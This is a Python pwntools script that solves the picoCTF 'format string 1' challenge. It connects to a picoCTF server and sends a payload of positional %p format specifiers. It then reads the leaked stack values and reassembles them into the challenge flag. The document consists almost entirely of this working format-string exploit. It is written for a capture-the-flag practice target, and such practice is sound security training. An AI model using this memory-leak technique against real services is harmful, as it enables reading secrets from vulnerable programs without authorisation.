# picoCTF-format-string-1-exploit.py
# by Aidan Wech (ahwech)
# nc mimas.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "mimas.picoctf.net"
    port = 55558

    # variables that leak flag using format string vuln
    start_flag_pointer = 14
    end_flag_pointer = 19
    payload = ""
    for i in range(start_flag_pointer, end_flag_pointer):
        payload += f"%{i}$p|"

    p = remote(host, port)

    # put in payload as order
    p.recvline(timeout=1)
    p.sendline(payload.encode("utf-8"))
    p.recvuntil(b"order: ", timeout=1)

    # obtain leaked memory values
    leak = p.recvline(timeout=1).rstrip(b"|\n").split(b"|")
    p.recvall(timeout=1)
    p.close()

    # turn hex values into readable string chunks
    flag = ""
    for i in range(end_flag_pointer - start_flag_pointer - 1):
        flag += p32(int(leak[i].decode('utf-8')[10:], 16)).decode('utf-8')
        flag += p32(int(leak[i].decode('utf-8')[2:10], 16)).decode('utf-8')
    
    # custom translation for the last leaked hex (ignore last null byte)
    flag += p32(int(leak[len(leak) - 1].decode('utf-8')[8:], 16)).decode('utf-8')
    flag += p32(int(leak[len(leak) - 1].decode('utf-8')[2:8], 16)).decode('utf-8')
    flag = flag[0:(len(flag) - 1)]

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()